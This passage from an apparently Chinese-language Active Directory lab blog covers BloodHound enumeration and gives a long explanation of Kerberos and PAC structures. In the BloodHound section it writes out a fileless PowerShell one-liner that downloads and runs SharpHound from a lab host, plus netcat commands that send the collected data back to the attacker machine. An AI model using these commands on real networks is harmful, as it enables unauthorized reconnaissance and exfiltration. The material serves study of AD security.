<h4 id="get-domainuser-name-“AStar”"><a href="#get-domainuser-name-“AStar”" class="headerlink" title="get-domainuser -name “AStar”"></a>get-domainuser -name “AStar”</h4><p><img src="/img/2020/windows_ad/windows_AD_lab1_16.png" alt=""></p>
<h3 id="ADSI"><a href="#ADSI" class="headerlink" title="ADSI"></a>ADSI</h3><p><code>Active Directory Service Interfaces (ADSI)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Active Directory Service Interface (ADSI) 是一組植基於 COM 技術上的應用程式開發介面，</span><br><span class="line">程式開發人員可以利用這些介面來連接並存取 Active Directory，並執行查詢，更新或刪除等管理功能，</span><br><span class="line">ADSI同時可支援以LDAP（輕量級目錄存取協定）為主的目錄服務（例如Novell Directory Service），</span><br><span class="line">以及以 Windows NT 網域為主所組成的 WinNT 網域目錄。</span><br></pre></td></tr></table></figure>
<h4 id="bloodhound-kali"><a href="#bloodhound-kali" class="headerlink" title="bloodhound (kali)"></a>bloodhound (kali)</h4><p>下載點:<a href="https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1</a><br>這邊模擬以 powershell 進行無檔案下載執行的方式操作</p>
<p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/SharpHound.ps1&#39;)&quot;</code></p>
<p>經實測後發現透過 <code>cmd.exe</code> 呼叫 powershell 執行會失敗QQ<br><code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/SharpHound.ps1&#39;);invoke-bloodhound -collectionmethod all -ZipFileName trainingBlood.zip&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab1_17.png" alt=""></p>
<p>要直接用 powershell 的 shell 執行才會成功<br><img src="/img/2020/windows_ad/windows_AD_lab1_18.png" alt=""></p>
<p>如果是 powershell 再叫 <code>powershell.exe</code> 再執行也會失敗，可能需要特別注意一下</p>
<p>成功執行之後會產出一個 zip 檔案，需要再把他拉回 Kali<br>這邊用比較經典的手法─下載 nc.exe 把它傳回來</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_19.png" alt=""></p>
<p>kali:<br><code>nc -l 1234 &gt; file.zip</code></p>
<p>windows:<br><code>nc 192.168.43.140 1234 &lt; 20201022015434_trainingBlood.zip</code></p>
<p>bloodhound 與 neo4j 在 kali 都能夠用 <code>apt install</code> 裝好</p>
<p>在啟動 bloodhound 之前記得先用 <code>neo4j console</code> 啟動 neo4j<br><img src="/img/2020/windows_ad/windows_AD_lab1_20.png" alt=""></p>
<p>啟動 bloodhound 之後上傳 zip 檔案<br><img src="/img/2020/windows_ad/windows_AD_lab1_21.png" alt=""></p>
<p>等他跑完之後可以確認一下 database 有沒有資料<br><img src="/img/2020/windows_ad/windows_AD_lab1_22.png" alt=""></p>
<p>之後可以針對 query 去顯示自己想要的資訊</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_23.png" alt=""></p>
<p>也可以用下面的 <code>Raw Query</code> 自己找想要的資訊，目前只知道</p>
<p><code>MATCH (n:User) RETURN n</code> 和 <code>MATCH (n:Group) RETURN n</code><br><img src="/img/2020/windows_ad/windows_AD_lab1_24.png" alt=""></p>
<h2 id="Kerberos-Introduction"><a href="#Kerberos-Introduction" class="headerlink" title="Kerberos Introduction"></a>Kerberos Introduction</h2><p>一張圖當作 overview</p>
<p><img src="http://adsecurity.org/wp-content/uploads/2015/04/Visio-KerberosComms.png" alt=""></p>
<p>Kerberos 認證主要由三方來完成的，分別是<br><code>client</code>、 <code>server</code>、<code>KDC(Key Distribution Center)</code>, 以上圖來說 Domain Controller 就包含了 KDC</p>
<p>而 <code>KDC</code> 又是由兩個服務組成，分別是 <code>AS(Authentication Service)</code> 和 <code>TGS(Ticket Granting Service)</code> 所組成</p>
<p>AS 是用來為 client 生成 <code>TGT</code> 的，TGS 是用來為 client 生成某服務的 <code>Ticket</code></p>
<p><code>TGT(Ticket Granting Ticket)</code> 是給 client 用來獲得某服務的 Ticket 所需的臨時憑證，<code>Ticket</code>是 client 用來訪問某個服務所需要的票證</p>
<p><code>只有</code>透過 <code>TGT</code> 才能獲得 <code>Ticket</code>, 有了 <code>Ticket</code> 才能訪問服務</p>
<p>在 windows 當中， <code>Domain Controller</code> 扮演了 KDC 的角色，要注意的是，他有一個類似於 <code>本機安全帳戶管理員 (SAM)</code> 的資料庫 AD(Account Database)</p>
<p>裡面存有 client list, 只有在 <code>Account Database</code>內的 client 才能獲得 TGT, 從物理層面來看，AD 與 KDC 都是 DC</p>
<h3 id="請求流程分解動作"><a href="#請求流程分解動作" class="headerlink" title="請求流程分解動作"></a>請求流程分解動作</h3><ol>
<li><p>client 先向 DC 發起 request, 要求訪問 server 的權限，當 DC 收到 req 之後，AC 會向 AD (Account Database) 發起請求，查看是否有該 client</p>
</li>
<li><p>如果確定有該 user, 會由 AS 將 TGT 發給 client</p>
</li>
<li><p>獲得 TGT 的 client 再繼續向 DC 發起帶著 TGT 的 request, 要求獲得訪問 server 服務的 Ticket, 當 DC 收到 req 之後， TGS 會判斷該 TGT 是否合法 (vaild)</p>
</li>
<li><p>成功後，會由 TGS 將 Ticket 發給 client</p>
</li>
<li><p>最後 client 拿著該 Ticket 去訪問所請求的 server, 這個 Ticket 只對該 server 有效，如果要訪問其他 server 必須重新跟 DC 申請一次</p>
</li>
<li><p>(OPTIONAL)不一定有，僅有該服務需要進一步驗證的時候才會出現</p>
</li>
<li><p>(OPTIONAL) 如果有開 PAC 的話，<code>2.</code> 的TGT 裡面會有 PAC 的資訊，他會跟著被包進 Ticket 裡面一起送給 Server ，當收到 Ticket 之後 Server 就會將 PAC 發給 KDC 確認其內容</p>
</li>
<li><p>(OPTIONAL)當 KDC 收到 PAC 之後就會解密並確認用戶的資訊是否有足夠的權限存取該服務，並回傳一個結果給 Server</p>
</li>
</ol>
<p>針對 1. 2. 的流程做進一步的解析<br><img src="/img/2020/windows_ad/windows_AD_ker_1.png" alt=""><br>自己整理出來的@@<br><img src="/img/2020/windows_ad/windows_AD_ker_2.png" alt=""></p>
<p>經過 1. 2. 之後會在本地端存一個 TGT，可以透過 <code>klist</code> 拿到更完整的資訊<br><img src="/img/2020/windows_ad/windows_AD_ker_7.png" alt=""></p>
<p>拿到了 TGT 之後下一步針對 3. 4. 的流程做進一步分析<br><img src="/img/2020/windows_ad/windows_AD_ker_3.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_ker_4.png" alt=""></p>
<p>經過 3. 4. 之後會在本地端存一個 Server Ticket, 可以透過 <code>klist</code> 拿到更完整的資訊<br><img src="/img/2020/windows_ad/windows_AD_ker_8.png" alt=""></p>
<p>最後:<br><img src="/img/2020/windows_ad/windows_AD_ker_5.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_ker_6.png" alt=""></p>
<p>上面有關 Ticket 的部分僅列出進行認證時必要的資訊，如果需要最完整的還是看微軟官方的文件最準(畢竟都加密了@@)</p>
<p>這是在沒有開啟 <code>PAC</code> 的情況下的傳輸方式</p>
<h3 id="PAC-Privileged-Attribute-Certificate"><a href="#PAC-Privileged-Attribute-Certificate" class="headerlink" title="PAC (Privileged Attribute Certificate)"></a>PAC (Privileged Attribute Certificate)</h3><p>在上面的驗證中我們知道只要 user 是在 Accounts Database 裡面，並且提供該 user 的 NTLM hash 就可以取得 Active Directory 下的<code>任意服務</code></p>
<p>對，任意服務，他並不會去審核該使用者的權限，直到 <code>PAC</code> 出來之前</p>
<p><code>PAC</code> 顧名思義就是 Windows 為了補足權限控管而制定的，他全程都用 krbtgt 的 NTLM hash 進行加密，使用者照道理無法解開查看</p>
<p>他會在 <code>KRB_AS_REP</code> 裡面的 TGT 多放一個 PAC, PAC 的內容大致有該 Client (User) 所在群組的 sid, 和使用者的相關訊息 </p>
<p>再講細一點</p>
<p>PAC的架構大概是長這個樣子</p>
<p><img src="/img/2020/windows_ad/windows_AD_ker_9.png" alt=""></p>
<p>PAC整體的結構上是一個AuthorizationData的結構</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- NOTE: AuthorizationData is always used as an OPTIONAL field and should not be empty.</span><br><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">  ad-type         [0] Int32,</span><br><span class="line">  ad-data         [1] OCTET STRING</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而 AuthorizationData 的 <code>ad-type</code> 有以下幾個種類與其對應的 int 值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">This file contains registrations of Kerberos ad-type values.  Send</span><br><span class="line">email to ghudson@mit.edu with corrections or requests for new</span><br><span class="line">assignments.</span><br><span class="line"></span><br><span class="line">Each entry should contain:</span><br><span class="line">* A number</span><br><span class="line">* A reference to the governing standard, with section number</span><br><span class="line">* A symbolic constant name from the governing standard, preferrably</span><br><span class="line">  the name of the ASN.1 type associated with the number (usually in</span><br><span class="line">  uppercase with hyphens)</span><br><span class="line"></span><br><span class="line">A number may have multiple entries if there is a conflict.  The only</span><br><span class="line">known conflicts are for ad-type 142, which has been resolved by moving</span><br><span class="line">AD-SIGNTICKET to ad-type 512, and ad-type 143, where the conflict can</span><br><span class="line">easily be resolved based on the type of protocol operation.</span><br><span class="line"></span><br><span class="line">1    AD-IF-RELEVANT (rfc4120 7.5.4)</span><br><span class="line">2    AD-INTENDED-FOR-SERVER (rfc4120 7.5.4)</span><br><span class="line">3    AD-INTENDED-FOR-APPLICATION-CLASS (rfc4120 7.5.4)</span><br><span class="line">4    AD-KDC-ISSUED (rfc4120 7.5.4)</span><br><span class="line">5    AD-AND-OR (rfc4120 7.5.4)</span><br><span class="line">6    AD-MANDATORY-TICKET-EXTENSIONS (rfc4120 7.5.4)</span><br><span class="line">7    AD-IN-TICKET-EXTENSIONS (rfc4120 7.5.4)</span><br><span class="line">8    AD-MANDATORY-FOR-KDC (rfc4120 7.5.4)</span><br><span class="line">9    AD_INITIAL_VERIFIED_CAS (rfc4556 3.1.2)</span><br><span class="line">10-63 reserved  (rfc4120 7.5.4)</span><br><span class="line">64   OSF-DCE (rfc4120 7.5.4)</span><br><span class="line">65   SESAME (rfc4120 7.5.4)</span><br><span class="line">66   AD-OSF-DCE-PKI-CERTID (rfc4120 7.5.4)</span><br><span class="line">70   AD-authentication-strength (rfc6113 5.5)</span><br><span class="line">71   AD-fx-fast-armor (rfc6113 5.4.1.1)</span><br><span class="line">72   AD-fx-fast-used (rfc6113 5.4.2)</span><br><span class="line">80   AD-LOGIN-ALIAS (rfc6806 6)</span><br><span class="line">96   AD-CAMMAC (rfc7751 4)</span><br><span class="line">97   AD-AUTHENTICATION-INDICATOR (rfc8129 3)</span><br><span class="line">128  AD-WIN2K-PAC (rfc4120 7.5.4, MS-PAC)</span><br><span class="line">129  AD-ETYPE-NEGOTIATION (rfc4120 7.5.4, rfc4537 3)</span><br><span class="line">130  reserved (AD-AP-REP-USE-SUBKEY, details forthcoming)</span><br><span class="line">141  KERB-AD-RESTRICTION-ENTRY (MS-KILE 2.2.6)</span><br><span class="line">142  KERB-LOCAL (MS-KILE 2.2.4)</span><br><span class="line">143  AD-AUTH-DATA-AP-OPTIONS (MS-KILE 3.2.5.8)</span><br><span class="line">143  ad-pku2u-client-name (draft-zhu-pku2u-09 6.3)</span><br><span class="line">144  reserved (Microsoft; details unknown)</span><br><span class="line">145  reserved (Microsoft; details unknown)</span><br><span class="line">512  AD-SIGNTICKET (MIT krb5 and Heimdal S4U2Self evidence ticket)</span><br><span class="line">513  AD-DIAMETER (draft-vanrein-krb5-authzdata-diameter-01 2)</span><br><span class="line">580  AD-ON-BEHALF-OF (Heimdal for RFC6717 updates)</span><br><span class="line">581  AD-BEARER-TOKEN-JWT (Heimdal for RFC6717 updates)</span><br><span class="line">582  AD-BEARER-TOKEN-SAML (Heimdal for RFC6717 updates)</span><br><span class="line">583  AD-BEARER-TOKEN-OIDC (Heimdal for RFC6717 updates)</span><br><span class="line">584  AD-CERT-REQ-AUTHORIZED (Heimdal for RFC6717 updates)</span><br><span class="line"></span><br><span class="line">The following are outdated or deprecated assignments:</span><br><span class="line"></span><br><span class="line">142  AD-SIGNTICKET-OLD (conflicted with Microsoft (KERB-LOCAL) )</span><br></pre></td></tr></table></figure>
<p>ref: <a href="https://github.com/krb5/krb5-assignments/blob/master/ad-type" target="_blank" rel="noopener">https://github.com/krb5/krb5-assignments/blob/master/ad-type</a></p>
<p>可以往上 mapping 到 PAC 的架構，你可以把他想成最外層是一個 AuthorizationData 的架構，ad-type 為 <code>AD-IF-RELEVANT</code>, ad-data 裡面還是一個 AuthorizationData 的架構，ad-type 為 <code>AD-WIN2K-PAC</code> 這樣子層層包起來</p>
<p>而 <code>AD-WIN2K-PAC</code> 裡面又包了以 <code>PACTYPE</code> 為內容的 header, 或是說 <code>PACTYPE</code> 是 PAC 最上層的結構 (按照 docs 的說法是這樣)</p>
<p><img src="/img/2020/windows_ad/windows_AD_ker_10.png" alt=""></p>
<p>我看了很久才知道上面那一串數字是為了對應下面所說的 <code>32 bits</code>… ( 我猜的 )<br>這邊簡單說一下 <code>PACTYPE</code> 內的東西</p>
<h4 id="PACTYPE"><a href="#PACTYPE" class="headerlink" title="PACTYPE"></a>PACTYPE</h4><ul>
<li>cBuffers (4 bytes): 以 32 位元的無符號整數 (unsigned integer) 加上 little endian 的格式定義在 <code>Buffers</code> 內的項目數</li>
<li>Version (4 bytes): 以 32 位元的無符號整數 (unsigned integer) 加上 little endian 的格式定義 PAC 的版本，必須為 0x00000000</li>
<li>Buffers (variable): 以 <code>PAC_INFO_BUFFER</code> 為結構的陣列</li>
</ul>
<p>怕我寫得太爛，會看程式碼的可以直接參考這個:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned long ULONG;</span><br><span class="line">typedef unsigned short USHORT;</span><br><span class="line">typedef unsigned long64 ULONG64;</span><br><span class="line">typedef unsigned char UCHAR;</span><br><span class="line"></span><br><span class="line">typedef struct _PACTYPE &#123;</span><br><span class="line">    ULONG cBuffers;</span><br><span class="line">    ULONG Version;</span><br><span class="line">    PAC_INFO_BUFFER Buffers[1];</span><br><span class="line">&#125; PACTYPE;</span><br></pre></td></tr></table></figure></p>
<p>跟我一樣資結還給老師的這個給你們看<br><a href="https://programming.im.ncnu.edu.tw/Chapter5.htm" target="_blank" rel="noopener">https://programming.im.ncnu.edu.tw/Chapter5.htm</a></p>
<p>那 <code>PAC_INFO_BUFFER</code> 又是什麼呢 ?</p>
<p>他是接在 <code>PACTYPE</code> 之後(數個)的 array, 他主要定義內部資料的種類和 byte offset, 這個後面會說明，並且它也沒有特別去定義順序，並且對 <code>PAC_INFO_BUFFER</code> 來說 <code>array</code> 的先後順序也沒有意義，但如果經過 KDC 或 Server 加密後順序就不能亂改了，不然在驗證有效性的步驟時候會失敗</p>
<p><img src="/img/2020/windows_ad/windows_AD_ker_11.png" alt=""></p>
<h4 id="PAC-INFO-BUFFER"><a href="#PAC-INFO-BUFFER" class="headerlink" title="PAC_INFO_BUFFER"></a>PAC_INFO_BUFFER</h4><ul>
<li>ulType (4 bytes): 以 32 位元的無符號整數 (unsigned integer) 加上 little endian 的格式定義 <code>Offset</code> 所指向的 buffer 內部的<code>資料型態</code><ul>
<li>不同的 <code>Value</code> 就對應到不同的資料型態，這邊就大概列一下</li>
</ul>
</li>
</ul>

<table class="table table-bordered table-striped table-condensed">
<thead>
  <tr>
    <th class="text-center">Value</th>
    <th class="text-center">Meaning</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td style="vertical-align: middle;">0x00000001</td>
    <td class="tg-lboi">Logon information (section 2.5). PAC structures&nbsp;&nbsp;&nbsp;MUST contain one buffer of this type. Additional logon information buffers&nbsp;&nbsp;&nbsp;MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x00000002</td>
    <td class="tg-lboi">Credentials information (section 2.6). PAC&nbsp;&nbsp;&nbsp;structures SHOULD NOT contain more than one buffer of this type, based on&nbsp;&nbsp;&nbsp;constraints specified in section 2.6. Second or subsequent credentials&nbsp;&nbsp;&nbsp;information buffers MUST be ignored on receipt.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x00000006</td>
    <td class="tg-lboi">Server checksum (section 2.8). PAC structures&nbsp;&nbsp;&nbsp;MUST contain one buffer of this type. Additional logon server checksum&nbsp;&nbsp;&nbsp;buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x00000007</td>
    <td class="tg-8py8">KDC (privilege&nbsp;&nbsp;&nbsp;server) checksum (section 2.8). PAC structures MUST contain one buffer of&nbsp;&nbsp;&nbsp;this type. Additional KDC checksum buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000A</td>
    <td class="tg-lboi">Client name and ticket information (section 2.7).&nbsp;&nbsp;&nbsp;PAC structures MUST contain one buffer of this type. Additional client and&nbsp;&nbsp;&nbsp;ticket information buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000B</td>
    <td class="tg-8py8">Constrained&nbsp;&nbsp;&nbsp;delegation information (section 2.9). PAC structures MUST contain one buffer of this type&nbsp;&nbsp;&nbsp;for Service for User to Proxy (S4U2proxy) [MS-SFU] requests and none otherwise. Additional constrained&nbsp;&nbsp;&nbsp;delegation information buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000C</td>
    <td class="tg-8py8">User&nbsp;&nbsp;&nbsp;principal name (UPN) and Domain Name System (DNS) information (section 2.10). PAC structures SHOULD NOT&lt;3&gt; contain more than one&nbsp;&nbsp;&nbsp;buffer of this type. Second or subsequent UPN and DNS information buffers&nbsp;&nbsp;&nbsp;MUST be ignored on receipt.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000D</td>
    <td class="tg-8py8">Client&nbsp;&nbsp;&nbsp;claims information (section 2.11). PAC structures SHOULD NOT&lt;4&gt; contain more than one buffer of this type. Additional&nbsp;&nbsp;&nbsp;client claims information buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000E</td>
    <td class="tg-8py8">Device&nbsp;&nbsp;&nbsp;information (section 2.12).&nbsp;&nbsp;&nbsp;PAC structures SHOULD NOT&lt;5&gt; contain more than one buffer of this type. Additional&nbsp;&nbsp;&nbsp;device information buffers MUST be ignored.</td>
  </tr>
  <tr>
    <td style="vertical-align: middle;">0x0000000F</td>
    <td class="tg-8py8">Device&nbsp;&nbsp;&nbsp;claims information (section 2.13). PAC structures SHOULD NOT&lt;6&gt; contain more than one buffer of this type. Additional&nbsp;&nbsp;&nbsp;device claims information buffers MUST be ignored.</td>
  </tr>
</tbody>
</table>

<ul>
<li>cbBufferSize (4 bytes): 顧名思義，以 32 位元的無符號整數 (unsigned integer) 加上 little endian 的格式定義 buffer 的大小* Offset (8 bytes): 以 <code>64</code> 位元的無符號整數 (unsigned integer) 加上 little endian 的格式定義 buffer 的初始位置<code>的偏移量</code>，其 buffer 包含 <code>PACTYPE</code>, 其呈現必須以 8 bytes 為單位進行</li>
<li>Offset (8 bytes): 以 <code>64</code> 位元的無符號整數 (unsigned integer) 加上 little endian 的格式，以 <code>PACTYPE</code> 的初始位置為開頭，定義 buffer 的初始位置<code>偏移量</code> ( the offset to the beginning of the buffer )，其呈現必須以 8 bytes 為單位進行排列</li>
</ul>
<p>一樣附上程式碼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> typedef unsigned long ULONG;</span><br><span class="line"> typedef unsigned short USHORT;</span><br><span class="line"> typedef unsigned long64 ULONG64;</span><br><span class="line"> typedef unsigned char UCHAR;</span><br><span class="line"></span><br><span class="line"> typedef struct _PAC_INFO_BUFFER &#123;</span><br><span class="line">          ULONG ulType;</span><br><span class="line">          ULONG cbBufferSize;</span><br><span class="line">          ULONG64 Offset;</span><br><span class="line">      &#125; PAC_INFO_BUFFER;</span><br><span class="line"></span><br><span class="line"> Type fields are defined as follows:</span><br><span class="line"></span><br><span class="line"> ulType - contains the type of data contained in this buffer. For</span><br><span class="line">         Windows 2000 access control, it may be one of the</span><br><span class="line">         following, which are explained further below:</span><br><span class="line"></span><br><span class="line">         #define PAC_LOGON_INFO               1</span><br><span class="line">         #define PAC_SERVER_CHECKSUM          6</span><br><span class="line">         #define PAC_PRIVSVR_CHECKSUM         7</span><br><span class="line"></span><br><span class="line">Offset - contains the offset to the beginning of the data, in bytes,</span><br><span class="line">        from the beginning of the PACTYPE structure. The data</span><br><span class="line">        offset must by a multiple of 8. If the data pointed to by</span><br><span class="line">        this field is complex, the data is typically NDR encoded.</span><br><span class="line">        If the data is simple (indicating it includes no pointer</span><br><span class="line">        types or complex structures) it is a little-endian format</span><br><span class="line">        data structure.</span><br></pre></td></tr></table></figure></p>
<p>最後就是 PAC 最核心的部分 <code>KERB_VALIDATION_INFO</code></p>
<h4 id="KERB-VALIDATION-INFO"><a href="#KERB-VALIDATION-INFO" class="headerlink" title="KERB_VALIDATION_INFO"></a>KERB_VALIDATION_INFO</h4><p>KERB_VALIDATION_INFO 內部存有使用者的登入與授權訊息，其架構為 <code>序列化後的陣列數組 (KERB_VALIDATION_INFO structure is serialized into an array of bytes)</code></p>
<p>它接在 <code>PACTYPE</code> 的 <code>Buffers</code> 後面，其資訊可以在對應的 <code>PAC_INFO_BUFFER</code> 找到，<code>Offset</code> 定義出他的 buffer 偏移量，<code>ulType</code> 會被設定為 <code>0x00000001</code></p>
<p>KERB_VALIDATION_INFO 內部的詳細資訊如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line"> FILETIME LogonTime;</span><br><span class="line"> FILETIME LogoffTime;</span><br><span class="line"> FILETIME KickOffTime;</span><br><span class="line"> FILETIME PasswordLastSet;</span><br><span class="line"> FILETIME PasswordCanChange;</span><br><span class="line"> FILETIME PasswordMustChange;</span><br><span class="line"> RPC_UNICODE_STRING EffectiveName;</span><br><span class="line"> RPC_UNICODE_STRING FullName;</span><br><span class="line"> RPC_UNICODE_STRING LogonScript;</span><br><span class="line"> RPC_UNICODE_STRING ProfilePath;</span><br><span class="line"> RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line"> RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line"> USHORT LogonCount;</span><br><span class="line"> USHORT BadPasswordCount;</span><br><span class="line"> ULONG UserId;</span><br><span class="line"> ULONG PrimaryGroupId;</span><br><span class="line"> ULONG GroupCount;</span><br><span class="line"> [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;</span><br><span class="line"> ULONG UserFlags;</span><br><span class="line"> USER_SESSION_KEY UserSessionKey;</span><br><span class="line"> RPC_UNICODE_STRING LogonServer;</span><br><span class="line"> RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line"> PISID LogonDomainId;</span><br><span class="line"> ULONG Reserved1[2];</span><br><span class="line"> ULONG UserAccountControl;</span><br><span class="line"> ULONG SubAuthStatus;</span><br><span class="line"> FILETIME LastSuccessfulILogon;</span><br><span class="line"> FILETIME LastFailedILogon;</span><br><span class="line"> ULONG FailedILogonCount;</span><br><span class="line"> ULONG Reserved3;</span><br><span class="line"> ULONG SidCount;</span><br><span class="line"> [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line"> PISID ResourceGroupDomainSid;</span><br><span class="line"> ULONG ResourceGroupCount;</span><br><span class="line"> [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>
<p>透過 impacket 裡面的 <code>getPac</code> 可以得到 PAC 的內容:<br>不過有發現 static binary 的版本，就不用特別裝 python<br><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 